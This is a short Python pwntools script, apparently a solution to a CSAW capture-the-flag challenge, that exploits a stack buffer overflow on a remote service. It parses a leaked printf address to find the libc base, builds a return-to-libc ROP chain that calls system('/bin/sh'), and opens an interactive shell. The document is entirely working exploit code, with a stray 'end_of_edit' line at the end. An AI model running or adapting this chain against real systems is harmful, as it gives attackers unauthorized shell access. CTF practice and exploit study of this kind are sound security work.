from pwn import *

context.log_level = 'info'

HOST = "pwn.chal.csaw.io"
PORT = 8000

printf_off = 0x64e80
system_off = 0x4f440
binsh_off  = 0x1b3e9a
pop_rdi    = 0x400793

p = remote(HOST, PORT)
p.recvuntil(b"Hello!\n")
line = p.recvline()
log.info(line)
printf_leak = int(line.split(b"Here I am: ")[1].strip(), 16)
libc_base = printf_leak - printf_off
log.success("libc base: %#x" % libc_base)

system = libc_base + system_off
binsh  = libc_base + binsh_off

payload  = b"A" * 40
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)

p.sendline(payload)
p.interactive()
end_of_edit

